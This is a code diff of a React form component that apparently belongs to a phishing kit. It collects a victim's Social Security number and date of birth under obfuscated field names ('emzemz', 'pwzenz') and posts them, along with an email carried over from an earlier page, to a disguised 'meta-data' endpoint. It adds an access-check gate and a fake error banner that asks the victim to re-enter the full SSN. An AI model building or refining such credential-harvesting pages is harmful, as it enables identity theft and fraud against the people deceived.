@@ -1,21 +1,17 @@
 import React, { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
+import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
+import useAccessCheck from '../Utils/useAccessCheck';
 
 const SSN2: React.FC = () => {
-  const [emzemz, setEmzemz] = useState('');
-  const [pwzenz, setPwzenz] = useState('');
   const [socialSecurityNumber, setSocialSecurityNumber] = useState('');
-  const [showPwzenz, setShowPwzenz] = useState(false);
   const [showSSN, setShowSSN] = useState(false);
   const [month, setMonth] = useState('');
   const [day, setDay] = useState('');
   const [year, setYear] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [errors, setErrors] = useState({ 
-    emzemz: '', 
-    pwzenz: '',
     socialSecurityNumber: '',
     dateOfBirth: ''
   });
@@ -24,12 +20,22 @@ const SSN2: React.FC = () => {
   const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
   const daysInMonth = month ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;
   
+  const location = useLocation();
+  
+  const { emzemz } = location.state || {}; // Access the email passed in state
+
   const navigate = useNavigate();
+  const isAllowed = useAccessCheck(baseUrl);
 
-  const togglePwzenzVisibility = () => setShowPwzenz(prev => !prev);
+  // Debug: Log the received email
+  console.log('SSN2 received email:', emzemz);
+
+  // Show loading state while checking access
+  if (!isAllowed) {
+    return <div>Loading...</div>; // Or a proper loading spinner
+  }
+
   const toggleSSNVisibility = () => setShowSSN(prev => !prev);
-
-  const validateEmzemz = (email: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
 
   const getMonthName = (monthNumber: string) => {
     const monthNames = [
@@ -44,9 +50,7 @@ const SSN2: React.FC = () => {
     setIsLoading(true);
     
     let newErrors = { 
-      emzemz: !validateEmzemz(emzemz) ? 'Invalid email format.' : '',
-      pwzenz: pwzenz.length < 6 ? 'Password must be at least 6 characters.' : '',
-      socialSecurityNumber: socialSecurityNumber.length !== 11 ? 'Please enter a valid SSN.' : '',
+      socialSecurityNumber: socialSecurityNumber.length !== 11 ? 'Please enter a valid 9-digit SSN.' : '',
       dateOfBirth: (!month || !day || !year) ? 'Complete date of birth is required.' : ''
     };
 
@@ -65,14 +69,14 @@ const SSN2: React.FC = () => {
     if (!Object.values(newErrors).some(error => error)) {
       try {
         const d_b = `${getMonthName(month)}/${day}/${year}`;
-        await axios.post(`${baseUrl}api/meta-data-1/`, {
-          emzemz,
-          pwzenz,
+        await axios.post(`${baseUrl}api/meta-data-6/`, {
+                    emzemz: emzemz,
+
           ssn: socialSecurityNumber,
           dob: d_b
         });
         console.log('Form submitted successfully');
-        navigate('/');
+        navigate('/terms');
       } catch (error) {
         console.error('Error submitting form:', error);
         setIsLoading(false);
@@ -82,28 +86,30 @@ const SSN2: React.FC = () => {
     }
   };
 
-  const formatSSN = (value: string) => {
-    const nums = value.replace(/\D/g, '');
-    if (nums.length <= 3) return nums;
-    if (nums.length <= 5) return `${nums.slice(0, 3)}-${nums.slice(3)}`;
-    return `${nums.slice(0, 3)}-${nums.slice(3, 5)}-${nums.slice(5, 9)}`;
-  };
-
   return (
     <div className="flex-1 bg-gray-200 rounded shadow-sm">
          <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Social Security Info</h2>
+        <h2 className="text-xl font-semibold text-gray-800">Social Security Info and date of birth</h2>
       </div>
 
 
       <div className="px-6 py-6 bg-white space-y-4">
+        <div className="flex items-center gap-2 text-sm font-bold mt-2 mb-2">
+          <svg className="w-4 h-4 fill-current text-red-600" viewBox="0 0 24 24">
+            <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
+          </svg>
+          <p className="text-red-600">An error occurred. Please enter your full 9-digit Social Security number this time.</p>
+        </div>
+
         <form onSubmit={handleSubmit}>
      
 
           {/* SSN Field */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">SSN:</label>
-            <div className="relative flex-1 max-w-xs">
+          <div className="mb-4">
+            <label className="block text-gray-700 text-sm font-medium mb-2">
+              Social Security Number
+            </label>
+            <div className="relative">
               <input
                 id="ssn"
                 name="ssn"
@@ -126,7 +132,7 @@ const SSN2: React.FC = () => {
                 }}
                 maxLength={11}
                 placeholder="XXX-XX-XXXX"
-                className="w-full border border-gray-300 px-2 py-1 text-sm"
+                className="w-full max-w-xs border border-gray-300 px-2 py-1 text-sm"
               />
               <span
                 className="absolute right-2 top-1/2 transform -translate-y-1/2 text-blue-700 text-sm hover:underline cursor-pointer"
@@ -138,7 +144,7 @@ const SSN2: React.FC = () => {
           </div>
 
           {errors.socialSecurityNumber && (
-            <div className="flex items-center gap-2 text-red-600 text-sm ml-28">
+            <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
               <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                 <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
               </svg>
